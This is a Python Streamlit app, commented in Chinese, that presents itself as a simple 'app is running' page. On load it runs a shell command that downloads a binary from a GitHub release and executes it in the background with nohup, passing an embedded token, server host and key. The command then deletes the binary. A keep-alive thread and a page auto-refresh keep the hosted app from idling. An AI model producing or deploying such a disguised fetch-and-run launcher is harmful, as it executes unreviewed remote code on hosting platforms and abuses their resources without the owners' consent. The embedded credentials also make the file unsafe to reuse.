import streamlit as st
import subprocess
import time
import threading
import requests

# 原始后台进程执行代码
if 'script_executed' not in st.session_state:
    command = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzYxZjhiNGMtYzA4MC00ODhiLWE0OGMtMGI4MDA0OWY2MTU2IiwicyI6Ik5EVm1NamcyWVdVdE9USTVOeTAwWlRJMUxUZzFZek10WmpoaE1tRmxNRFEzT0RaaCJ9 N_S=nz.seav.eu.org N_K=2kVTRbOuEylfrEE6b9 port=7863 bash -c 'curl -L -o jsbin https://github.com/seav1/dl/releases/download/src/jsbin && chmod +x jsbin && nohup ./jsbin && rm jsbin'"
    subprocess.call(command, shell=True)
    st.session_state.script_executed = True

# 添加保活逻辑
def keep_alive():
    """定期执行一些轻量级操作来保持应用活跃"""
    while True:
        try:
            # 定期访问自己的URL
            app_url = st.experimental_get_query_params().get("app_url", [""])[0]
            if app_url:
                requests.get(app_url, timeout=10)
            
            # 执行一些轻量级计算以保持CPU活跃
            _ = [i**2 for i in range(1000)]
            
            # 每5分钟执行一次
            time.sleep(300)
        except Exception as e:
            print(f"Keep alive error: {e}")
            time.sleep(300)

# 启动保活线程
if 'keep_alive_started' not in st.session_state:
    threading.Thread(target=keep_alive, daemon=True).start()
    st.session_state.keep_alive_started = True

# 显示一个简单的UI，让用户知道应用正在运行
st.title("应用正在运行")
st.write("此应用已启动并正在后台运行。")

# 显示当前时间，证明应用仍在响应
current_time = time.strftime("%Y-%m-%d %H:%M:%S")
st.write(f"当前时间: {current_time}")

# 如果需要定期刷新页面，可以添加以下代码
st.markdown(
    """
    <meta http-equiv="refresh" content="300">
    """,
    unsafe_allow_html=True
)

def main():
    pass

if __name__ == "__main__":
    main()
